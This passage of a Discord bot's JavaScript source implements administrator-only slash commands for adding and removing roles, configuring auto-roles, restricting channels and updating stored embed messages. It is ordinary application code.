        ephemeral: true
      });
    }

    // Check if bot has permission to manage roles
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.ManageRoles)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to manage roles.',
        ephemeral: true
      });
    }

    // Check role hierarchy
    const botHighestRole = interaction.guild.members.me.roles.highest;
    if (role.position >= botHighestRole.position) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I cannot assign a role that is higher than or equal to my highest role.',
        ephemeral: true
      });
    }

    if (mode === 'user') {
      if (!targetUser) {
        return interaction.reply({
          content: '<:no:1393890945929318542> Please select a user when using specific user mode.',
          ephemeral: true
        });
      }

      try {
        const member = await interaction.guild.members.fetch(targetUser.id);
        
        if (member.roles.cache.has(role.id)) {
          return interaction.reply({
            content: `<:no:1393890945929318542> ${targetUser.tag} already has the ${role.name} role.`,
            ephemeral: true
          });
        }

        await member.roles.add(role);

        const embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle('Role Added')
          .setDescription(`Successfully added the **${role.name}** role to ${targetUser.tag}.`)
          .addFields(
            { name: 'User', value: `${targetUser.tag}`, inline: true },
            { name: 'Role', value: `${role.name}`, inline: true },
            { name: 'Added by', value: `${interaction.user.tag}`, inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `User ID: ${targetUser.id}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
      } catch (error) {
        console.error('Add role error:', error);
        await interaction.reply({
          content: '<:no:1393890945929318542> Failed to add role. The user may not be in the server or I lack permissions.',
          ephemeral: true
        });
      }
    } else if (mode === 'all') {
      await interaction.reply({ content: 'Adding role to all members... This may take a while.', ephemeral: true });

      try {
        const members = await interaction.guild.members.fetch();
        let successCount = 0;
        let skipCount = 0;
        let errorCount = 0;

        for (const [, member] of members) {
          if (member.user.bot) continue; // Skip bots
          
          try {
            if (!member.roles.cache.has(role.id)) {
              await member.roles.add(role);
              successCount++;
            } else {
              skipCount++;
            }
          } catch (error) {
            errorCount++;
          }
          
          // Small delay to avoid rate limits
          await new Promise(resolve => setTimeout(resolve, 100));
        }

        const embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle('Role Added to All Members')
          .setDescription(`Finished adding the **${role.name}** role to server members.`)
          .addFields(
            { name: 'Successfully Added', value: `${successCount} members`, inline: true },
            { name: 'Already Had Role', value: `${skipCount} members`, inline: true },
            { name: 'Errors', value: `${errorCount} members`, inline: true },
            { name: 'Role', value: `${role.name}`, inline: true },
            { name: 'Added by', value: `${interaction.user.tag}`, inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `Total members processed: ${successCount + skipCount + errorCount}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.followUp({ embeds: [embed] });
      } catch (error) {
        console.error('Add role to all error:', error);
        await interaction.followUp({
          content: '<:no:1393890945929318542> Failed to add role to all members. I may lack permissions.',
          ephemeral: true
        });
      }
    }
  }

  if (interaction.commandName === 'autorole') {
    const mode = interaction.options.getString('mode');
    const role = interaction.options.getRole('role');
    commandStats.autorole++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission to manage roles
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.ManageRoles)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to manage roles.',
        ephemeral: true
      });
    }

    let embed;

    switch (mode) {
      case 'set':
        if (!role) {
          return interaction.reply({
            content: '<:no:1393890945929318542> Please select a role when using set mode.',
            ephemeral: true
          });
        }

        // Check role hierarchy
        const botHighestRole = interaction.guild.members.me.roles.highest;
        if (role.position >= botHighestRole.position) {
          return interaction.reply({
            content: '<:no:1393890945929318542> I cannot assign a role that is higher than or equal to my highest role.',
            ephemeral: true
          });
        }

        // Save auto role setting
        autoRoleSettings.set(interaction.guild.id, role.id);
        await saveAutoRoleSettings(interaction.guild.id, role.id);

        embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle('Auto Role Configured')
          .setDescription(`New members will automatically receive the **${role.name}** role when they join the server.`)
          .addFields(
            { name: 'Auto Role', value: `${role.name}`, inline: true },
            { name: 'Status', value: 'Active', inline: true },
            { name: 'Configured by', value: `${interaction.user.tag}`, inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `Guild ID: ${interaction.guild.id}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;

      case 'remove':
        const currentAutoRole = autoRoleSettings.get(interaction.guild.id);
        if (!currentAutoRole) {
          return interaction.reply({
            content: '<:no:1393890945929318542> No auto role is currently configured.',
            ephemeral: true
          });
        }

        const removedRole = interaction.guild.roles.cache.get(currentAutoRole);
        const removedRoleName = removedRole ? removedRole.name : 'Unknown Role';

        autoRoleSettings.delete(interaction.guild.id);
        await deleteAutoRoleSettings(interaction.guild.id);

        embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('Auto Role Removed')
          .setDescription('Auto role assignment has been disabled. New members will no longer automatically receive a role.')
          .addFields(
            { name: 'Previous Auto Role', value: removedRoleName, inline: true },
            { name: 'Status', value: 'Disabled', inline: true },
            { name: 'Removed by', value: `${interaction.user.tag}`, inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `Guild ID: ${interaction.guild.id}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;

      case 'status':
        const autoRoleId = autoRoleSettings.get(interaction.guild.id);
        
        if (!autoRoleId) {
          embed = new EmbedBuilder()
            .setColor(0x6b7280)
            .setTitle('Auto Role Status')
            .setDescription('No auto role is currently configured.')
            .addFields(
              { name: 'Status', value: 'Disabled', inline: true },
              { name: 'Action', value: 'Use `/autorole mode:set` to configure', inline: true }
            )
            .setTimestamp()
            .setFooter({
              text: `Requested by ${interaction.user.tag}`,
              iconURL: interaction.user.displayAvatarURL()
            });
        } else {
          const autoRole = interaction.guild.roles.cache.get(autoRoleId);
          
          if (!autoRole) {
            // Role was deleted, clean up
            autoRoleSettings.delete(interaction.guild.id);
            await deleteAutoRoleSettings(interaction.guild.id);
            
            embed = new EmbedBuilder()
              .setColor(0xff6b6b)
              .setTitle('Auto Role Status')
              .setDescription('The configured auto role was deleted. Auto role has been disabled.')
              .addFields(
                { name: 'Status', value: 'Disabled (role deleted)', inline: true },
                { name: 'Action', value: 'Use `/autorole mode:set` to configure a new role', inline: true }
              )
              .setTimestamp()
              .setFooter({
                text: `Requested by ${interaction.user.tag}`,
                iconURL: interaction.user.displayAvatarURL()
              });
          } else {
            const botMember = interaction.guild.members.me;
            const canAssign = botMember && botMember.permissions.has(PermissionFlagsBits.ManageRoles) && 
                            autoRole.position < botMember.roles.highest.position;

            embed = new EmbedBuilder()
              .setColor(canAssign ? 0x00ff88 : 0xfacc15)
              .setTitle('Auto Role Status')
              .setDescription('Auto role assignment is currently active.')
              .addFields(
                { name: 'Auto Role', value: `${autoRole.name}`, inline: true },
                { name: 'Status', value: canAssign ? 'Active' : 'Warning', inline: true },
                { name: 'Members Count', value: `${autoRole.members.size} members have this role`, inline: true }
              )
              .setTimestamp()
              .setFooter({
                text: `Requested by ${interaction.user.tag}`,
                iconURL: interaction.user.displayAvatarURL()
              });

            if (!canAssign) {
              embed.addFields({
                name: 'Permission Issue',
                value: 'I cannot assign this role due to permission or hierarchy issues.',
                inline: false
              });
            }
          }
        }

        await interaction.reply({ embeds: [embed] });
        break;
    }
  }

  if (interaction.commandName === 'removerole') {
    const mode = interaction.options.getString('mode');
    const role = interaction.options.getRole('role');
    const targetUser = interaction.options.getUser('user');
    commandStats.removerole++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission to manage roles
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.ManageRoles)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to manage roles.',
        ephemeral: true
      });
    }

    // Check role hierarchy
    const botHighestRole = interaction.guild.members.me.roles.highest;
    if (role.position >= botHighestRole.position) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I cannot remove a role that is higher than or equal to my highest role.',
        ephemeral: true
      });
    }

    if (mode === 'user') {
      if (!targetUser) {
        return interaction.reply({
          content: '<:no:1393890945929318542> Please select a user when using specific user mode.',
          ephemeral: true
        });
      }

      try {
        const member = await interaction.guild.members.fetch(targetUser.id);
        
        if (!member.roles.cache.has(role.id)) {
          return interaction.reply({
            content: `<:no:1393890945929318542> ${targetUser.tag} doesn't have the ${role.name} role.`,
            ephemeral: true
          });
        }

        await member.roles.remove(role);

        const embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('Role Removed')
          .setDescription(`Successfully removed the **${role.name}** role from ${targetUser.tag}.`)
          .addFields(
            { name: 'User', value: `${targetUser.tag}`, inline: true },
            { name: 'Role', value: `${role.name}`, inline: true },
            { name: 'Removed by', value: `${interaction.user.tag}`, inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `User ID: ${targetUser.id}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
      } catch (error) {
        console.error('Remove role error:', error);
        await interaction.reply({
          content: '<:no:1393890945929318542> Failed to remove role. The user may not be in the server or I lack permissions.',
          ephemeral: true
        });
      }
    } else if (mode === 'all') {
      await interaction.reply({ content: 'Removing role from all members... This may take a while.', ephemeral: true });

      try {
        const members = await interaction.guild.members.fetch();
        let successCount = 0;
        let skipCount = 0;
        let errorCount = 0;

        for (const [, member] of members) {
          if (member.user.bot) continue; // Skip bots
          
          try {
            if (member.roles.cache.has(role.id)) {
              await member.roles.remove(role);
              successCount++;
            } else {
              skipCount++;
            }
          } catch (error) {
            errorCount++;
          }
          
          // Small delay to avoid rate limits
          await new Promise(resolve => setTimeout(resolve, 100));
        }

        const embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('Role Removed from All Members')
          .setDescription(`Finished removing the **${role.name}** role from server members.`)
          .addFields(
            { name: 'Successfully Removed', value: `${successCount} members`, inline: true },
            { name: 'Didn\'t Have Role', value: `${skipCount} members`, inline: true },
            { name: 'Errors', value: `${errorCount} members`, inline: true },
            { name: 'Role', value: `${role.name}`, inline: true },
            { name: 'Removed by', value: `${interaction.user.tag}`, inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `Total members processed: ${successCount + skipCount + errorCount}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.followUp({ embeds: [embed] });
      } catch (error) {
        console.error('Remove role from all error:', error);
        await interaction.followUp({
          content: '<:no:1393890945929318542> Failed to remove role from all members. I may lack permissions.',
          ephemeral: true
        });
      }
    }
  }

  if (interaction.commandName === 'restrictchannel') {
    const channel = interaction.options.getChannel('channel');
    const action = interaction.options.getString('action');
    commandStats.restrictchannel++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    if (channel.type !== 0) { // Must be text channel
      return interaction.reply({
        content: '<:no:1393890945929318542> Please select a text channel.',
        ephemeral: true
      });
    }

    // Get or create restricted channels set for this guild
    let guildRestrictedChannels = restrictedChannels.get(interaction.guild.id);
    if (!guildRestrictedChannels) {
      guildRestrictedChannels = new Set();
      restrictedChannels.set(interaction.guild.id, guildRestrictedChannels);
    }

    const isCurrentlyRestricted = guildRestrictedChannels.has(channel.id);

    let embed;

    switch (action) {
      case 'restrict':
        if (isCurrentlyRestricted) {
          return interaction.reply({
            content: `<:no:1393890945929318542> ${channel} is already restricted.`,
            ephemeral: true
          });
        }

        guildRestrictedChannels.add(channel.id);
        await saveRestrictedChannels(interaction.guild.id, Array.from(guildRestrictedChannels));

        embed = new EmbedBuilder()
          .setColor(0xff6b6b)
          .setTitle('Channel Restricted')
          .setDescription(`${channel} is now restricted to commands only.`)
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Status', value: 'Commands Only', inline: true },
            { name: 'Allowed', value: 'Slash commands and prefix commands', inline: false },
            { name: 'Blocked', value: 'Regular text, links, and media (auto-deleted)', inline: false },
            { name: 'Bypassed by', value: 'Server Owner, Bot Owner, and Administrators', inline: false }
          )
          .setTimestamp()
          .setFooter({
            text: `Restricted by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;

      case 'unrestrict':
        if (!isCurrentlyRestricted) {
          return interaction.reply({
            content: `<:no:1393890945929318542> ${channel} is not currently restricted.`,
            ephemeral: true
          });
        }

        guildRestrictedChannels.delete(channel.id);
        await saveRestrictedChannels(interaction.guild.id, Array.from(guildRestrictedChannels));

        embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle('Channel Unrestricted')
          .setDescription(`${channel} is now unrestricted and allows normal messages.`)
          .addFields(
            { name: 'Channel', value: `${channel}`, inline: true },
            { name: 'Status', value: 'Normal Messages Allowed', inline: true },
            { name: 'Messages', value: 'All message types are now allowed', inline: false }
          )
          .setTimestamp()
          .setFooter({
            text: `Unrestricted by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;

      case 'status':
        const totalRestricted = guildRestrictedChannels.size;
        const restrictedChannelsList = totalRestricted > 0 ? 
          Array.from(guildRestrictedChannels).slice(0, 10).map(id => `<#${id}>`).join('\n') + 
          (totalRestricted > 10 ? `\n+${totalRestricted - 10} more` : '') :
          'No channels are currently restricted';

        embed = new EmbedBuilder()
          .setColor(isCurrentlyRestricted ? 0xff6b6b : 0x0ea5e9)
          .setTitle('Channel Restriction Status')
          .setDescription(`Status for ${channel}`)
          .addFields(
            { name: 'Current Status', value: isCurrentlyRestricted ? 'Restricted (Commands Only)' : '✅ Unrestricted (Normal Messages)', inline: true },
            { name: 'Total Restricted Channels', value: `${totalRestricted}`, inline: true },
            { name: 'Restricted Channels', value: restrictedChannelsList, inline: false }
          )
          .setTimestamp()
          .setFooter({
            text: `Checked by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.reply({ embeds: [embed] });
        break;
    }
  }

  if (interaction.commandName === 'embedupdate') {
    const embedId = interaction.options.getString('embed_id');
    const newChannel = interaction.options.getChannel('channel');
    const newTitle = interaction.options.getString('title');
    const newDescription = interaction.options.getString('description');
    const newColorInput = interaction.options.getString('color');
    const newThumbnail = interaction.options.getString('thumbnail');
    const newImage = interaction.options.getString('image');
    const newFooter = interaction.options.getString('footer');
    const newTimestamp = interaction.options.getBoolean('timestamp');
    const newButtonsInput = interaction.options.getString('buttons');
    commandStats.embedupdate++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Get existing embed data
    const existingEmbed = await getEmbed(interaction.guild.id, embedId);
    if (!existingEmbed) {
      return interaction.reply({
        content: `<:no:1393890945929318542> Embed with ID \`${embedId}\` not found. Use \`/embedcreate\` to create a new embed.`,
        ephemeral: true
      });
    }

    // Validate new channel if provided
    const targetChannel = newChannel || (existingEmbed.channelId ? interaction.guild.channels.cache.get(existingEmbed.channelId) : null);
    if (newChannel && newChannel.type !== 0) { // 0 = GUILD_TEXT
      return interaction.reply({
        content: '<:no:1393890945929318542> Please select a text channel.',
        ephemeral: true
      });
    }

    if (!targetChannel) {
      return interaction.reply({
        content: '<:no:1393890945929318542> No channel found for this embed and none provided. Please provide a channel.',
        ephemeral: true
      });
    }

    // Merge new data with existing data (keep existing if new is not provided)
    const updatedEmbedData = {
      ...existingEmbed,
      title: newTitle !== null ? newTitle : existingEmbed.title,
      description: newDescription !== null ? newDescription : existingEmbed.description,
      color: newColorInput !== null ? newColorInput : existingEmbed.color,
      thumbnail: newThumbnail !== null ? newThumbnail : existingEmbed.thumbnail,
      image: newImage !== null ? newImage : existingEmbed.image,
      footer: newFooter !== null ? newFooter : existingEmbed.footer,
      timestamp: newTimestamp !== null ? newTimestamp : existingEmbed.timestamp,
      buttons: newButtonsInput !== null ? newButtonsInput : existingEmbed.buttons,
      channelId: newChannel ? newChannel.id : existingEmbed.channelId,
      updatedBy: interaction.user.id,
      updatedAt: Date.now()
    };

    // Parse color input
    let color = 0x0099ff; // Default blue color
    if (updatedEmbedData.color) {
      // Handle hex colors
      if (updatedEmbedData.color.startsWith('#')) {
        const hexColor = parseInt(updatedEmbedData.color.slice(1), 16);
        if (!isNaN(hexColor)) {
          color = hexColor;
        }
      } else if (updatedEmbedData.color.startsWith('0x')) {
        const hexColor = parseInt(updatedEmbedData.color, 16);
        if (!isNaN(hexColor)) {
          color = hexColor;
        }
      } else {
        // Handle color names
        const colorNames = {
          'red': 0xff0000, 'green': 0x00ff00, 'blue': 0x0000ff, 'yellow': 0xffff00,
          'orange': 0xffa500, 'purple': 0x800080, 'pink': 0xffc0cb, 'cyan': 0x00ffff,
          'magenta': 0xff00ff, 'lime': 0x00ff00, 'black': 0x000000, 'white': 0xffffff,
          'gray': 0x808080, 'grey': 0x808080, 'silver': 0xc0c0c0, 'gold': 0xffd700,
          'navy': 0x000080, 'teal': 0x008080, 'maroon': 0x800000, 'olive': 0x808000
        };
        
        const lowerColor = updatedEmbedData.color.toLowerCase();
        if (colorNames[lowerColor]) {
          color = colorNames[lowerColor];
        }
      }
    }

    try {
      const embed = new EmbedBuilder()
        .setColor(color)
        .setTitle(updatedEmbedData.title)
        .setDescription(updatedEmbedData.description);

      // Add optional elements
      if (updatedEmbedData.thumbnail) {
        try {
          new URL(updatedEmbedData.thumbnail); // Validate URL
          embed.setThumbnail(updatedEmbedData.thumbnail);
        } catch {
          return interaction.reply({
            content: '<:no:1393890945929318542> Invalid thumbnail URL provided.',
            ephemeral: true
          });
        }
      }

      if (updatedEmbedData.image) {
        try {
          new URL(updatedEmbedData.image); // Validate URL
          embed.setImage(updatedEmbedData.image);
        } catch {
          return interaction.reply({
            content: '<:no:1393890945929318542> Invalid image URL provided.',
            ephemeral: true
          });
        }
      }

      if (updatedEmbedData.footer) {
        embed.setFooter({
          text: updatedEmbedData.footer,
          iconURL: interaction.user.displayAvatarURL()
        });
      }

      if (updatedEmbedData.timestamp) {
        embed.setTimestamp();
      }

      // Parse and create buttons
      const actionRows = [];
      if (updatedEmbedData.buttons) {
        try {
          // Split buttons by | separator
          const buttonPairs = updatedEmbedData.buttons.split('|');
          
          if (buttonPairs.length > 5) {
            return interaction.reply({
              content: '<:no:1393890945929318542> Maximum 5 buttons allowed.',
              ephemeral: true
            });
          }

          const buttons = [];

          // Helper function to parse emoji and create button
          function parseEmojiAndButton(rawButton) {
            // Match optional emoji, label, and URL - supports both <:name:id> and <a:name:id>
            const emojiMatch = rawButton.match(/^<(a?):([a-zA-Z0-9_]+):(\d+)>\s*(.*?),\s*(https?:\/\/\S+)$/);

            if (emojiMatch) {
              const animated = emojiMatch[1] === 'a';
              const name = emojiMatch[2];
              const id = emojiMatch[3];
              const label = emojiMatch[4].trim();
              const url = emojiMatch[5].trim();

              return {
                button: new ButtonBuilder()
                  .setLabel(label)
                  .setStyle(ButtonStyle.Link)
                  .setURL(url)
                  .setEmoji({ name, id, animated }),
                label,
                url
              };
            } else {
              // Fallback if no emoji - standard format
              const [label, url] = rawButton.split(',').map(s => s.trim());
              return {
                button: new ButtonBuilder()
                  .setLabel(label)
                  .setStyle(ButtonStyle.Link)
                  .setURL(url),
                label,
                url
              };
            }
          }

          for (const pair of buttonPairs) {
            try {
              const parsed = parseEmojiAndButton(pair);
              
              if (!parsed.label || !parsed.url) {
                return interaction.reply({
                  content: '<:no:1393890945929318542> Invalid button format. Use: "Label,URL" or "<:emoji:id> Label,URL" or "<a:emoji:id> Label,URL"',
                  ephemeral: true
                });
              }

              // Validate URL
              try {
                new URL(parsed.url);
              } catch {
                return interaction.reply({
                  content: `<:no:1393890945929318542> Invalid URL for button "${parsed.label}": ${parsed.url}`,
                  ephemeral: true
                });
              }

              if (parsed.label.length > 80) {
                return interaction.reply({
                  content: `<:no:1393890945929318542> Button label "${parsed.label}" is too long (max 80 characters).`,
                  ephemeral: true
                });
              }

              buttons.push(parsed.button);
            } catch (error) {
              return interaction.reply({
                content: `<:no:1393890945929318542> Error parsing button: "${pair}". Check format and try again.`,
                ephemeral: true
              });
            }
          }

          // Create action rows (max 5 buttons per row)
          while (buttons.length > 0) {
            const rowButtons = buttons.splice(0, 5);
            const actionRow = new ActionRowBuilder().addComponents(rowButtons);
            actionRows.push(actionRow);
          }

        } catch (error) {
          console.error('Button parsing error:', error);
          return interaction.reply({
            content: '<:no:1393890945929318542> Error parsing buttons. Format: "Label1,URL1|Label2,URL2|Label3,URL3"',
            ephemeral: true
          });
        }
      }

      // Save updated embed data to database
      await saveEmbed(interaction.guild.id, embedId, updatedEmbedData);

      // Prepare the updated embed message options
      const messageOptions = { embeds: [embed] };
      if (actionRows.length > 0) {
        messageOptions.components = actionRows;
      }

      // Try to update the original message if it exists, otherwise send new message
      let updateSuccess = false;
      let updateMessage = '';

      if (existingEmbed.messageId && targetChannel) {
        try {
          console.log(`Attempting to update message ${existingEmbed.messageId} in channel ${targetChannel.name}`);
          
          // Try to fetch and edit the original message
          const originalMessage = await targetChannel.messages.fetch(existingEmbed.messageId);
          await originalMessage.edit(messageOptions);
          updateSuccess = true;
          updateMessage = `✅ Embed successfully updated in ${targetChannel}`;
          console.log(`Successfully updated message ${existingEmbed.messageId}`);
        } catch (error) {
          console.error('Error updating original message, sending new message:', error);
          try {
            // If updating fails, send a new message
            const newMessage = await targetChannel.send(messageOptions);
            updatedEmbedData.messageId = newMessage.id;
            await saveEmbed(interaction.guild.id, embedId, updatedEmbedData);
            updateSuccess = true;
            updateMessage = `✅ Original message not found, sent new embed to ${targetChannel}`;
          } catch (sendError) {
            updateMessage = `⚠️ Failed to update or send new message: ${sendError.message}`;
          }
        }
      } else {
        try {
          // Send new message if no original message ID exists
          const newMessage = await targetChannel.send(messageOptions);
          updatedEmbedData.messageId = newMessage.id;
          await saveEmbed(interaction.guild.id, embedId, updatedEmbedData);
          updateSuccess = true;
          updateMessage = `✅ Embed sent to ${targetChannel} (no original message found)`;
        } catch (error) {
          updateMessage = `⚠️ Failed to send embed: ${error.message}`;
        }
      }

      // Create update confirmation embed
      const updateEmbed = new EmbedBuilder()
        .setColor(updateSuccess ? 0x00ff88 : 0xfacc15)
        .setTitle('Embed Update Complete')
        .setDescription(updateMessage)
        .addFields(
          { name: 'Embed ID', value: `\`${embedId}\``, inline: true },
          { name: 'Updated by', value: `${interaction.user.tag}`, inline: true },
          { name: 'Originally created by', value: `<@${existingEmbed.createdBy}>`, inline: true },
          { name: 'Channel', value: `${targetChannel}`, inline: true },
          { name: 'Status', value: updateSuccess ? '✅ Embed updated successfully' : '⚠️ Update failed', inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `Embed Management System`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.reply({ embeds: [updateEmbed], ephemeral: true });

      // If update failed, also show the preview
      if (!updateSuccess) {
        await interaction.followUp({ 
          content: '**Preview of updated embed:**',
          ...messageOptions, 
          ephemeral: true 
        });
      }

    } catch (error) {
      console.error('Embed update error:', error);
      await interaction.reply({
        content: '<:no:1393890945929318542> Failed to update embed. Please check your inputs and try again.',
        ephemeral: true
      });
    }
  }
});

client.login(process.env.BOT_TOKEN);

// Export the client for use in other modules
module.exports = { client };
